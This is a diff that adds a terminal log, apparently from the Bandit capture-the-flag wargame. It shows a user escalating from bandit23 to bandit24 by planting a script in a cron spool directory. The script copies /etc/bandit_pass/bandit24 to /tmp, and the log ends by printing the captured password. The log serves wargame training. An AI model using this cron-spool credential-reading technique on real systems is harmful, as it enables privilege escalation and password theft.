@@ -1,0 +1,58 @@
+bandit23@bandit:/tmp$ ls
+ls: cannot open directory '.': Permission denied
+bandit23@bandit:/tmp$ cd /
+bandit23@bandit:/$ ls
+behemoth           boot     etc         krypton  lib64              lost+found  media   opt   run                 snap  tmp     var
+bin                dev      formulaone  lib      lib.usr-is-merged  manpage     mnt     proc  sbin                srv   usr     vortex
+bin.usr-is-merged  drifter  home        lib32    libx32             maze        narnia  root  sbin.usr-is-merged  sys   utumno
+bandit23@bandit:/$ ls -ltr
+total 10768
+drwxr-xr-x     2 root root     4096 Feb 26  2024 bin.usr-is-merged
+drwxr-xr-x     2 root root     4096 Mar 31  2024 sbin.usr-is-merged
+drwxr-xr-x     2 root root     4096 Apr  8  2024 lib.usr-is-merged
+lrwxrwxrwx     1 root root        8 Apr 22  2024 sbin -> usr/sbin
+lrwxrwxrwx     1 root root        9 Apr 22  2024 lib64 -> usr/lib64
+lrwxrwxrwx     1 root root        7 Apr 22  2024 lib -> usr/lib
+lrwxrwxrwx     1 root root        7 Apr 22  2024 bin -> usr/bin
+drwxr-xr-x     2 root root     4096 Mar 21 10:14 mnt
+drwxr-xr-x     2 root root     4096 Mar 21 10:14 srv
+drwxr-xr-x     2 root root     4096 Mar 21 10:14 media
+drwx------     2 root root    16384 Mar 21 10:21 lost+found
+drwxr-xr-x     5 root root     4096 Mar 21 10:29 boot
+drwx------     6 root root     4096 Mar 21 10:30 snap
+lrwxrwxrwx     1 root root        9 Apr  3 15:10 lib32 -> usr/lib32
+lrwxrwxrwx     1 root root       10 Apr  3 15:10 libx32 -> usr/libx32
+drwxr-xr-x     6 root root     4096 Apr  3 15:12 opt
+drwxr-xr-x    14 root root     4096 Apr  3 15:17 usr
+drwxr-xr-x     2 root root     4096 Apr  3 15:18 behemoth
+drwxr-xr-x     7 root root     4096 Apr  3 15:18 drifter
+drwxr-xr-x     3 root root     4096 Apr  3 15:19 formulaone
+drwxr-xr-x     9 root root     4096 Apr  3 15:19 krypton
+drwxr-xr-x     3 root root     4096 Apr  3 15:19 manpage
+drwxr-xr-x     2 root root     4096 Apr  3 15:19 maze
+drwxr-xr-x     2 root root     4096 Apr  3 15:20 narnia
+drwxr-xr-x     2 root root     4096 Apr  3 15:20 utumno
+drwxr-xr-x   150 root root     4096 Apr  3 15:20 home
+drwxr-xr-x     2 root root     4096 Apr  3 15:21 vortex
+drwxr-xr-x   128 root root    12288 Apr  5 12:34 etc
+drwxr-xr-x    14 root root     4096 Apr  5 12:34 var
+drwx------     7 root root     4096 May 20 14:58 root
+dr-xr-xr-x    13 root root        0 May 25 10:29 sys
+drwxr-xr-x    32 root root     1020 Jun  1 20:49 run
+dr-xr-xr-x   696 root root        0 Jun 12 10:42 proc
+drwxr-xr-x    16 root root     3400 Jun 12 11:09 dev
+drwxrwx-wt 11762 root root 10899456 Jun 12 11:09 tmp
+bandit23@bandit:/$ MYDIR="/tmp/bandit23_$(date +%s)"; mkdir -m 777 $MYDIR && echo "cat /etc/bandit_pass/bandit24 > $MYDIR/pass" > $MYDIR/s.sh && chmod 777 $MYDIR/s.sh && cp
+     $MYDIR/s.sh /var/spool/bandit24/foo/s.sh && echo "Waiting for password in $MYDIR..." && sleep 65 && cat $MYDIR/pass
+
+cp: missing file operand
+Try 'cp --help' for more information.
+cat: /etc/bandit_pass/bandit24: Permission denied
+bandit23@bandit:/$ cd /tmp/dean
+bandit23@bandit:/tmp/dean$ ls
+deanscript  deanscript.  deanscript.sh  deansc.sh  nano.22.save
+bandit23@bandit:/tmp/dean$   echo "cat /etc/bandit_pass/bandit24 > /tmp/dean/pass.txt" > /tmp/dean/sol.sh
+bandit23@bandit:/tmp/dean$ chmod 777 /tmp/dean/sol.sh
+bandit23@bandit:/tmp/dean$  cp /tmp/dean/sol.sh /var/spool/bandit24/foo/sol.sh
+bandit23@bandit:/tmp/dean$  sleep 60 && cat /tmp/dean/pass.txt
+gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
